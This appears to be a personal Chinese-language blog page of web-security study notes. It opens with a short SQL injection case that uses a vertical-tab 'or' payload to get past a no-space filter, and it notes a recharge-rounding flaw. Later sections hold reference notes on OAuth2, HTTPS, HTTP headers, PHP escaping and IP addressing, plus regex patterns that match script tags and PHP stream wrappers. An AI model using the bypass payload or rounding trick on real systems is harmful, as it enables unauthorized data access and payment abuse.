<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sql注入案例</span><br><span class="line">1-1返回空</span><br><span class="line">1-0返回正常</span><br><span class="line">尝试and 1,报错,fuzz之后发现不能使用空格,使用1-sleep(1)报错,不能使用扩好，询问chatgpt,发现可以使用or造成查询所有数据，修改payload为or\u000b1，出所有数据,造成危害</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">充值0.019-&gt;0.01用户充-&gt;0.02服务端充</span><br></pre></td></tr></table></figure>

<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">	//	单行</span><br><span class="line">	/**/</span><br><span class="line">php</span><br><span class="line">	// 	#	单行</span><br><span class="line">	/**/</span><br><span class="line">MySQL注释符有三种：</span><br><span class="line">    #注释内容 &quot;--  注释内容&quot; 表示单行注释</span><br><span class="line">    /*注释内容*/</span><br><span class="line">phthon</span><br><span class="line">	#注释内容</span><br><span class="line">	&#x27;&#x27;&#x27;注释内容&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">hex		解释</span><br><span class="line">00		空字符</span><br><span class="line">0A		换行符</span><br><span class="line">0D		回车</span><br><span class="line">20		空格</span><br><span class="line">22		&quot;</span><br><span class="line">23		#</span><br><span class="line">25		%</span><br><span class="line">26		&amp;</span><br><span class="line">27		&#x27;</span><br><span class="line">2B		+</span><br><span class="line">2C		，</span><br><span class="line">2D		-</span><br><span class="line">2E		.</span><br><span class="line">2F		/</span><br><span class="line">30-39	字符0-9</span><br><span class="line">3A		:</span><br><span class="line">3B		;</span><br><span class="line">3C		&lt;</span><br><span class="line">3D		=</span><br><span class="line">3E		&gt;</span><br><span class="line">40		@</span><br><span class="line">41-5A	字符A-Z</span><br><span class="line">61-7A	字符a-z</span><br><span class="line">7E		~</span><br><span class="line">7F		删除</span><br></pre></td></tr></table></figure>

<h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth2.png" alt="oauth2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource owner是github</span><br><span class="line">resource server和authorization server都是</span><br><span class="line">b步骤获得授权信息是关键</span><br><span class="line">b获得的授权信息可以去获取access_token在用access_token获取资源</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth2_2.png" alt="oauth2_2"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\implicit_grant.png" alt="implicit_grant"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a步骤授权所需</span><br><span class="line">	应用名称</span><br><span class="line">	应用网站</span><br><span class="line">	重定向url或回调url(redirect_url)</span><br><span class="line">	客户端表示client_id</span><br><span class="line">	客户端密钥client_secret</span><br><span class="line">	</span><br><span class="line">oauth授权方式</span><br><span class="line">	1.授权码模式</span><br><span class="line">		刷新token模式 给了个有效时间和到期更新时提交的fresh_token值</span><br><span class="line">	2.简化模式</span><br><span class="line">		没有重定向的步骤直接返回了token</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\implicit_grant.png" alt="implicit_grant"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码模式</span><br><span class="line">用户向客户端提供自己的账号密码</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth_passwd.png" alt="oauth_passwd"></p>
<h3 id="https技术鉴赏"><a href="#https技术鉴赏" class="headerlink" title="https技术鉴赏"></a>https技术鉴赏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1uY4y1D7Ng</span><br><span class="line">凯撒密码(简单移位)-&gt;恩格码机(古典密码学)-&gt;DES</span><br><span class="line">需要密钥 DES 56位 对称加密</span><br><span class="line">非对称加密	公钥私钥成对出现</span><br><span class="line">公钥加密只能被私钥解密 私钥加密只能被公钥解密</span><br><span class="line">SSL握手 安全套接字</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\ssl.png" alt="ssl"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SSL1.0 2.0 3.0</span><br><span class="line">TLS1.0(SSL3.1) 1.1 1.2 1.3</span><br><span class="line">如果攻击者在获取公钥步骤进行盗取----&gt;&gt;&gt;&gt;CA证书</span><br><span class="line">CA(Certificate Authority)</span><br><span class="line">数据和加密后的数据构成证书</span><br><span class="line"></span><br><span class="line">CA机构造假----&gt;&gt;&gt;&gt;棱镜门</span><br><span class="line">证书透明 证书加入SCT 构成日志 监督日志 像区块链</span><br><span class="line"></span><br><span class="line">仍存在未解决的问题</span><br></pre></td></tr></table></figure>

<h3 id="手机app抓包渗透"><a href="#手机app抓包渗透" class="headerlink" title="手机app抓包渗透"></a>手机app抓包渗透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小米路由器需要设置WPA2模式加密</span><br><span class="line">同一局域网下 手机代理ip端口设为pc端局域网ip 192.168.31.90:8881</span><br><span class="line">即可抓包 不过慢</span><br></pre></td></tr></table></figure>

<h3 id="蠕虫病毒Synaptics-exe"><a href="#蠕虫病毒Synaptics-exe" class="headerlink" title="蠕虫病毒Synaptics.exe"></a>蠕虫病毒Synaptics.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\BaiduNetdiskDownload\北山学院直播班\北山学院工具脚本\云安全\小程序反编译（软件尽量在虚拟机运行）\wxappUnpacker\wxappUnpacker.exe 小程序解密文件运行就会出问题</span><br><span class="line"></span><br><span class="line">everything 删除._cache_</span><br><span class="line">删除C:\ProgramData\Synaptics</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u013102599/article/details/127512616</span><br></pre></td></tr></table></figure>

<h3 id="注册表删除-md后缀默认程序"><a href="#注册表删除-md后缀默认程序" class="headerlink" title="注册表删除.md后缀默认程序"></a>注册表删除.md后缀默认程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win11注册表中 第二项影响大于第一项</span><br><span class="line">1.删除	计算机\HKEY_CURRENT_USER\.md</span><br><span class="line">2.删除	计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md</span><br><span class="line">然后任务管理器重启资源管理器</span><br></pre></td></tr></table></figure>

<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/ZYC88888/article/details/98479629</span><br><span class="line">\x22	16进制unicode编码</span><br><span class="line">.	点 匹任何单个字符</span><br><span class="line">* &#123;0,&#125;</span><br><span class="line">+ &#123;1,&#125;</span><br><span class="line">? &#123;0,1&#125;	非贪婪模式匹配一个 除了?:(pattern)</span><br><span class="line">[^xyz]	不匹配xyz的单个字符</span><br><span class="line">?!(pattern)</span><br><span class="line">&#x27;oooo&#x27;	&#x27;o+&#x27;--&gt;&gt;[&quot;oooo&quot;]	&#x27;o+?&#x27;--&gt;&gt;[&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;]	前者贪婪模式	后者加上?非贪婪模式</span><br><span class="line"></span><br><span class="line">no matching regex</span><br><span class="line">(?:firefox|mozilla|baidu|googleapis|google|fjlqqc|google-analytics|youtube|stripe|fengkongcloud|hcfy|microsoft|firefoxchina|bingapis|wetab|bdimg|azureedge|bing|csdnimg)\.(?:net|org|com|cn|app|link)</span><br><span class="line"></span><br><span class="line">pycharm的正则替换	点亮Cc和.* 第一行写正则去匹配 第二行写改变的格式每一个之前匹配的都被搞成变量$1 $2存起来了 然后单机replace all</span><br><span class="line">^([^ ]*): (.*)		此处需要不匹配上面post_data的数据</span><br><span class="line">&quot;$1&quot;: &quot;$2&quot;,</span><br><span class="line"></span><br><span class="line">(&lt;script&gt;)</span><br><span class="line">(?:&lt;script&gt;|onmouseover|)</span><br><span class="line">(?:data|php|zlib|expect|glob|ssh2)(://)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230405144757515.png" alt="image-20230405144757515"></p>
<h3 id="php-过滤函数"><a href="#php-过滤函数" class="headerlink" title="php 过滤函数"></a>php 过滤函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">★addslashes()</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">预定义字符是：</span><br><span class="line"> 单引号（&#x27;）</span><br><span class="line"> 双引号（&quot;）</span><br><span class="line"> 反斜杠（\）</span><br><span class="line"> NULL</span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">语法：addslashes(string)</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">返回值： 返回已转义的字符串。</span><br><span class="line">PHP 版本： 4+</span><br><span class="line">★stripslashes()</span><br><span class="line">函数删除由 addslashes() 函数添加的反斜杠。 </span><br><span class="line">★mysql_real_escape_string()</span><br><span class="line">函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\ </span><br><span class="line">&#x27; </span><br><span class="line">&quot; </span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line">语法：mysql_real_escape_string(string,connection)</span><br><span class="line">参数 描述</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</span><br><span class="line">说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-头部"><a href="#HTTP-头部" class="headerlink" title="HTTP 头部"></a>HTTP 头部</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1、 Accept：告诉 WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</span><br><span class="line">2、 Accept-Charset： 浏览器申明自己接收的字符集 Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）Accept-Language：：浏览器申明自己接收的语言</span><br><span class="line">语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。</span><br><span class="line">3、 Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</span><br><span class="line">4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</span><br><span class="line">5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</span><br><span class="line">6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）响应：public(可以用 Cached 内容回应任何用户)private（只能用缓存内容回应先前请求该内容的那个用户）no-cache（可以缓存，但是只有在跟 WEB 服务器验证了其有效后，才能返回给客户端）max-age：（本响应包含的对象的过期时间）ALL: no-store（不允许缓存）</span><br><span class="line">7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。</span><br><span class="line">keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。响应：close（连接已经关闭）。keepalive（连接保持着，在等待本次连接的后续请求）。Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</span><br><span class="line">8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</span><br><span class="line">9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</span><br><span class="line">10、Content-Length：WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012</span><br><span class="line">11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</span><br><span class="line">12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</span><br><span class="line">13、 ETag：就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</span><br><span class="line">14、 Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</span><br><span class="line">15、 Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</span><br><span class="line">16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</span><br><span class="line">17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</span><br><span class="line">18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码 304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</span><br><span class="line">19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</span><br><span class="line">20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</span><br><span class="line">21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</span><br><span class="line">22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取 。 例如 ： Location ： http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</span><br><span class="line">23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache</span><br><span class="line">24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</span><br><span class="line">25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer:http://www.sina.com/</span><br><span class="line">27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix)</span><br><span class="line">28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</span><br><span class="line">29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</span><br><span class="line">30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</span><br><span class="line">31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的 Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13</span><br></pre></td></tr></table></figure>

<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符</span><br><span class="line">字符集</span><br><span class="line">字符编码</span><br><span class="line">ASCII</span><br><span class="line">GB2312	常见的6700多个中文字符集	16位</span><br><span class="line">GBK		汉字内码扩展规范  微软  技术规范</span><br><span class="line">UNICODE	万国码 统一码</span><br></pre></td></tr></table></figure>

<h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">网卡VMware Network Adapter VMnet0	桥接模式	Bridged</span><br><span class="line">网卡VMware Network Adapter VMnet1	仅主机模式	Host-Only</span><br><span class="line">网卡VMware Network Adapter VMnet8	NAT模式		网络地址转换模式</span><br><span class="line">https://blog.csdn.net/qq_39192827/article/details/85872025</span><br><span class="line"></span><br><span class="line"># 私有地址 内网地址</span><br><span class="line">A类							私有地址</span><br><span class="line">0 网络号 7位 主机号24位	10.0.0.0-10.255.255.255			10  00001010</span><br><span class="line">B类</span><br><span class="line">10 网络号14位 主机号16位	172.16.0.0-172.31.255.255		172  10101100</span><br><span class="line">C类</span><br><span class="line">110 网络号21位 主机号8位	192.168.0.0-192.168.255.255		192  11000000</span><br><span class="line">D类</span><br><span class="line">1110		多点广播</span><br><span class="line">E类</span><br><span class="line">11110		保留</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 特殊地址</span><br><span class="line">A类系统回环地址：127.0.0.0-----127.255.255.255</span><br><span class="line">每个计算机都有一个本地环回接口地址，是127.0.0.1，这个地址是用来测试本机的TCP/IP协议栈有没有正确安装的。</span><br><span class="line">B类地址：168.192.0.0---168.192.255.255</span><br><span class="line">B类保留地址：169.254.0.0----169.254.255.255</span><br><span class="line">D类地址：224.0.0.0-----239.255.255.255</span><br><span class="line">E类地址：240.0.0.0-----255.255.255.255</span><br><span class="line"></span><br><span class="line">0代表网络号 255代表广播地址 不能用</span><br><span class="line"></span><br><span class="line">百度搜ip</span><br><span class="line">公有ip117.136.119.167</span><br><span class="line">校园网是分配认证一个新的ip地址</span><br><span class="line">Ping 127.0.0.1通表明网络功能安装好了，具备可以上网的条件</span><br><span class="line">127.0.0.1-127.255.255.255用于回路测试</span><br><span class="line"></span><br><span class="line">端口具体到程序（QQ 微信 微博） 	0-65535（2的16次）标记程序</span><br><span class="line">进出网络程序的通道</span><br><span class="line">分类</span><br><span class="line">知名端口 0-1023 		特殊程序		超级管理员</span><br><span class="line">21端口		分配给FTP</span><br><span class="line">22端口 		ssh远程登录Linux系统</span><br><span class="line">80端口		网站一般用端口</span><br><span class="line">69端口		用于文件下载</span><br><span class="line"></span><br><span class="line">动态端口 1024-65535	普通 			直接用</span><br><span class="line"></span><br><span class="line">netstat --help</span><br><span class="line">netstat -an	查看端口状态</span><br><span class="line">netstat -ano</span><br><span class="line">isof -i [tcp/udp]:2425</span><br></pre></td></tr></table></figure>

<h3 id="jdk与jre与java"><a href="#jdk与jre与java" class="headerlink" title="jdk与jre与java"></a>jdk与jre与java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_42257666/article/details/105701938</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jdk比jre多一个虚拟环境 jre是.java文件的解释器 开发用jdk 相当于程序员和操作系统中间夹了jdk(虚拟机环境+jre)</span></span><br><span class="line"></span><br><span class="line">Java X=Java SE X=JDK1.X</span><br><span class="line">Java SE 8就是Java8，或者jdk1.8</span><br></pre></td></tr></table></figure>

<h3 id="浏览器工作原理"><a href="#浏览器工作原理" class="headerlink" title="浏览器工作原理"></a>浏览器工作原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.输入url 用户在浏览器中输入网址(包含所需资源位置和协议)</span><br><span class="line">2.DNS查询</span><br><span class="line">3.建立链接 根据url协议与目标服务器建立链接</span><br><span class="line">4.发送请求 浏览器向服务器发送http请求 请求中包含资源路径和请求方法</span><br><span class="line">5.服务器响应</span><br><span class="line"></span><br><span class="line">6.渲染页面 浏览器收到html文件后 开始解析并构建文档对象模型(DOM)。DOM是网页结构化表示，可以通过javascript进行操作。</span><br><span class="line">7.加载资源 浏览器发现html文件中其他资源(CSS js 图片)发送额外请求来获取这些资源。同时会根据css贵族对页面进行样式渲染。</span><br><span class="line">8.执行js 浏览器运行js代码 可能会操作dom 更改样式或与服务器进一步通信 js使页面更具动态和交互性。</span><br><span class="line"></span><br><span class="line">9.显示完成</span><br><span class="line">10.关闭连接</span><br></pre></td></tr></table></figure>

<h3 id="Centos安装"><a href="#Centos安装" class="headerlink" title="Centos安装"></a>Centos安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_59430185/article/details/119108112</span><br><span class="line">配置</span><br><span class="line">	字符集为UTF-8				这个搞错终端中文字符乱码</span><br><span class="line">	echo LANG=”zh_CN.UTF-8” &gt; /etc/locale.conf</span><br><span class="line">启用网卡</span><br><span class="line">	echo ONBOOT=yes &gt;&gt; /etc/sysconfig/net-scripts/ifcfg-ens33</span><br><span class="line">修改时间</span><br><span class="line">	date -s “2022/5/11 12:12:12” </span><br><span class="line">ssh服务</span><br><span class="line">	首先查看是否安装openssh-server</span><br><span class="line">yum list installed | grep openssh-server没装yum装</span><br><span class="line">root权限</span><br><span class="line">service sshd start打开</span><br><span class="line">ps -e | grep sshd或者netstat -an | grep 22检查ssh是否打开</span><br><span class="line">[Centos开启SSH服务_心若十年的博客-CSDN博客_centos开启ssh服务](https://blog.csdn.net/qq_41768362/article/details/117331798)</span><br></pre></td></tr></table></figure>

